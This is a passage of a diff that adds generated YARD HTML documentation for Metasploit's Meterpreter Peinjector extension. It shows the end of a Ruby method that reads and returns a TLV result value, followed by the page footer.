+  <span class='id identifier rubyid_error_msg'>error_msg</span> <span class='op'>=</span> <span class='id identifier rubyid_response'>response</span><span class='period'>.</span><span class='id identifier rubyid_get_tlv_value'>get_tlv_value</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../Peinjector.html#TLV_TYPE_PEINJECTOR_RESULT-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::TLV_TYPE_PEINJECTOR_RESULT (constant)">TLV_TYPE_PEINJECTOR_RESULT</a></span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_raise'>raise</span> <span class='id identifier rubyid_error_msg'>error_msg</span> <span class='kw'>if</span> <span class='id identifier rubyid_error_msg'>error_msg</span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_response'>response</span><span class='period'>.</span><span class='id identifier rubyid_get_tlv_value'>get_tlv_value</span><span class='lparen'>(</span><span class='const'><span class='object_link'><a href="../Peinjector.html#TLV_TYPE_PEINJECTOR_RESULT-constant" title="Rex::Post::Meterpreter::Extensions::Peinjector::TLV_TYPE_PEINJECTOR_RESULT (constant)">TLV_TYPE_PEINJECTOR_RESULT</a></span></span><span class='rparen'>)</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:34:03 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
